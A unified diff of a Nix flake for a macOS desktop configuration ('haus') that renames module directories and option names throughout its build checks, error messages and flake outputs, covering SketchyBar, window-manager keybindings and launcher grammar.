@@ -2459,14 +2459,14 @@
               test -s theirs-modes && test -s theirs-shapes && test -s theirs-prefixes || {
                 echo "found ItemSettings.swift but not ItemTarget's modes/error text/parse —" >&2
                 echo "the shapes this check greps for are gone. Restore them, or replace" >&2
-                echo "this check with whatever keeps modules/pounce/item-grammar.nix in" >&2
+                echo "this check with whatever keeps modules/launcher/item-grammar.nix in" >&2
                 echo "step with the locked pounce — do not simply delete it." >&2
                 exit 1
               }
 
               diff -u ${pkgs.writeText "ours-modes" (builtins.concatStringsSep "\n" grammar.modes + "\n")} \
                       theirs-modes \
-                || { echo >&2; echo "left: modules/pounce/item-grammar.nix's \`modes\` · right: ItemTarget.modes in the locked pounce" >&2; exit 1; }
+                || { echo >&2; echo "left: modules/launcher/item-grammar.nix's \`modes\` · right: ItemTarget.modes in the locked pounce" >&2; exit 1; }
 
               diff -u ${pkgs.writeText "ours-shapes" (grammar.expectedText + "\n")} \
                       theirs-shapes \
@@ -2498,7 +2498,7 @@
           accessibility-surface = pkgs.runCommand "haus-accessibility-surface-ok" { } ''
             ${nixpkgs.lib.optionalString (a11yArmsMissing != [ ]) ''
               cat >&2 <<'GONE'
-              modules/den/haus.sh's classify_key no longer has a line matching:
+              modules/core/haus.sh's classify_key no longer has a line matching:
 
               ${builtins.concatStringsSep "\n              " (map (c: ''") echo ${c} ;;"'') a11yArmsMissing)}
 
@@ -2518,7 +2518,7 @@
                             builtins.concatStringsSep "\n" (a11yShellKeysOf class) + "\n"
                           )
                         } \
-                  || { echo >&2; echo "left: modules/lib/reachability.nix's \`${class}\` keys · right: classify_key's \`${class}\` arm in modules/den/haus.sh" >&2; exit 1; }
+                  || { echo >&2; echo "left: modules/lib/reachability.nix's \`${class}\` keys · right: classify_key's \`${class}\` arm in modules/core/haus.sh" >&2; exit 1; }
               '') a11yClasses
             )}
             touch $out
@@ -2582,9 +2582,9 @@
           # and therefore passed every evaluation/build check but never populated
           # the live process. Pin both source modes before another rc ships with
           # the same silent startup failure.
-          sill-rc-executable = pkgs.runCommand "haus-sill-rc-executable-ok" { } ''
-            test -x ${./modules/sill/sketchybar/sketchybarrc}
-            test -x ${./modules/sill/sketchybar/sill-bottomrc}
+          bar-rc-executable = pkgs.runCommand "haus-bar-rc-executable-ok" { } ''
+            test -x ${./modules/bar/sketchybar/sketchybarrc}
+            test -x ${./modules/bar/sketchybar/bar-bottomrc}
             touch $out
           '';
 
@@ -2600,17 +2600,17 @@
           # and are legitimately 0644, so they are named rather than pattern-
           # matched: a new library adds a line here, which is the moment to be
           # sure it really is one.
-          sill-plugins-executable = pkgs.runCommand "haus-sill-plugins-executable-ok" { } ''
+          bar-plugins-executable = pkgs.runCommand "haus-bar-plugins-executable-ok" { } ''
             libs="ai-provider.sh media_lib.sh vitals_lib.sh"
             bad=
-            for f in ${./modules/sill/sketchybar/plugins}/*.sh; do
+            for f in ${./modules/bar/sketchybar/plugins}/*.sh; do
               base=$(basename "$f")
               case " $libs " in *" $base "*) continue ;; esac
               test -x "$f" || bad="$bad $base"
             done
             if [ -n "$bad" ]; then
               echo "not executable, so SketchyBar can only fail with exit 126:$bad" >&2
-              echo "fix: git update-index --chmod=+x modules/sill/sketchybar/plugins/<name>" >&2
+              echo "fix: git update-index --chmod=+x modules/bar/sketchybar/plugins/<name>" >&2
               exit 1
             fi
             touch $out
@@ -2753,7 +2753,7 @@
             touch $out
           '';
 
-          sill-bottom-hush =
+          bar-bottom-focus =
             let
               cfg =
                 (mkHaus {
@@ -2762,10 +2762,10 @@
                   hostname = "example";
                   extraModules = [
                     {
-                      haus.hush.enable = true;
-                      haus.sill.bottom = {
+                      haus.focus.enable = true;
+                      haus.bar.bottom = {
                         enable = true;
-                        items.hush = true;
+                        items.focus = true;
                       };
                     }
                   ];
@@ -2774,13 +2774,13 @@
               bottom = pkgs.writeText "bottom_items.sh" cfg.home.file.".config/sketchybar/bottom_items.sh".text;
               routing = pkgs.writeText "bar.sh" cfg.home.file.".config/sketchybar/bar.sh".text;
             in
-            pkgs.runCommand "haus-sill-bottom-hush-ok" { } ''
-              if grep -q -- '--add item hush' ${top}; then
-                echo 'hush was duplicated on the top bar after moving to bottom.items' >&2
+            pkgs.runCommand "haus-bar-bottom-focus-ok" { } ''
+              if grep -q -- '--add item focus' ${top}; then
+                echo 'focus was duplicated on the top bar after moving to bottom.items' >&2
                 exit 1
               fi
-              grep -q -- '\$SB --add item hush' ${bottom}
-              grep -q 'SILL_BOTTOM_ITEMS="[^"]*hush' ${routing}
+              grep -q -- '\$SB --add item focus' ${bottom}
+              grep -q 'BAR_BOTTOM_ITEMS="[^"]*focus' ${routing}
               touch $out
             '';
 
@@ -2793,7 +2793,7 @@
           #
           # `clock = true` is here on purpose: this option shipped bool-only, so
           # the bool has to keep meaning the right group.
-          sill-bottom-groups =
+          bar-bottom-groups =
             let
               mkBottom =
                 items:
@@ -2803,7 +2803,7 @@
                   hostname = "example";
                   extraModules = [
                     {
-                      haus.sill.bottom = {
+                      haus.bar.bottom = {
                         enable = true;
                         inherit items;
                       };
@@ -2846,7 +2846,7 @@
               );
               left = pkgs.writeText "bottom_items.sh" allLeft.home.file.".config/sketchybar/bottom_items.sh".text;
             in
-            pkgs.runCommand "haus-sill-bottom-groups-ok" { } ''
+            pkgs.runCommand "haus-bar-bottom-groups-ok" { } ''
               grep -q -- '\$SB --add item agents left' ${bottom}
               grep -q -- '\$SB --add item calendar center' ${bottom}
               grep -q -- '\$SB --add item clock right' ${bottom}
@@ -2909,7 +2909,7 @@
           # binding table as JSON, resolved for the DEFAULT keymap.
           #
           # Exists for the docs repo's keybinding tripwire. That script used to
-          # `nix eval --json --file modules/prowl/wm-bindings.nix`, which worked
+          # `nix eval --json --file modules/windows/wm-bindings.nix`, which worked
           # only while that file was plain data; the keys.* change made it a
           # function of haus.keys.*, so the eval started failing with
           # "cannot convert a function to JSON" — a regression in ANOTHER repo, on
@@ -2937,7 +2937,7 @@
             in
             pkgs.writeText "wm-bindings.json" (
               builtins.toJSON (
-                import ./modules/prowl/wm-bindings.nix {
+                import ./modules/windows/wm-bindings.nix {
                   inherit (pkgs) lib;
                   inherit k;
                 }
@@ -2950,8 +2950,8 @@
           #
           # Second half of the tripwire above, and it exists because the first
           # half stopped covering it. Launch mode's digit rows were literal
-          # lines in modules/prowl/aerospace.toml, so the docs repo read them by
-          # parsing that file; haus.prowl.numberedWorkspaces turned them into a
+          # lines in modules/windows/aerospace.toml, so the docs repo read them by
+          # parsing that file; haus.windows.numberedWorkspaces turned them into a
           # generated block, and a parser looking for `1 = [...]` found a token
           # and reported no change. Published rather than parsed, for the same
           # reason the option reference is rendered rather than written.
@@ -2961,17 +2961,17 @@
             let
               # The SHIPPED default count, read off the option rather than
               # retyped — a literal 4 here would be a second copy of
-              # modules/prowl/options.nix's default, and the copy that goes
+              # modules/windows/options.nix's default, and the copy that goes
               # stale is the one nothing evaluates. An options-only module
               # evaluates on its own, which is the same purity that lets the
               # option reference be rendered at all.
               default =
-                (pkgs.lib.evalModules { modules = [ ./modules/prowl/options.nix ]; })
-                .config.haus.prowl.numberedWorkspaces;
+                (pkgs.lib.evalModules { modules = [ ./modules/windows/options.nix ]; })
+                .config.haus.windows.numberedWorkspaces;
             in
             pkgs.writeText "launch-keys.json" (
               builtins.toJSON (
-                import ./modules/prowl/launch-keys.nix {
+                import ./modules/windows/launch-keys.nix {
                   inherit (pkgs) lib;
                   numbered = import ./modules/lib/numbered.nix { inherit (pkgs) lib; } default;
                 }
@@ -3007,7 +3007,7 @@
           #
           # A package rather than a checked-in file on purpose: built from the
           # revision a machine has actually pinned, it can only ever describe
-          # the options that exist there. hearth installs it into every client's
+          # the options that exist there. terminal installs it into every client's
           # own skills directory (haus.ai.skill), so `haus update` updates
           # the agent's knowledge along with the rice.
           #
@@ -3015,14 +3015,14 @@
           # Claude Code's alone. Not aliased: a flake output is named in a
           # command someone types, not pinned in a config that would silently
           # break, and `nix build .#` lists the new one.
-          agent-skill = import ./modules/hearth/agents/skill.nix { inherit pkgs; };
+          agent-skill = import ./modules/terminal/agents/skill.nix { inherit pkgs; };
 
           # `nix build .#host-template` — the annotated host file a fresh
           # install is scaffolded with: every haus.* option at its default,
           # described, docs-linked, and commented out (see host-template.nix for
           # why commented). Two consumers, both needing it built from a SPECIFIC
           # revision rather than committed: bootstrap.sh, on a Mac that has no
-          # haus yet, and `haus options` on one that does — den installs it
+          # haus yet, and `haus options` on one that does — core installs it
           # into the system profile so that second path costs nothing.
           host-template = import ./modules/host-template.nix { inherit pkgs; };
 
@@ -3059,7 +3059,7 @@
               inherit (surface)
                 theme
                 ui
-                sill
+                bar
                 fonts
                 ;
               cfg = surface.wallpaper // {
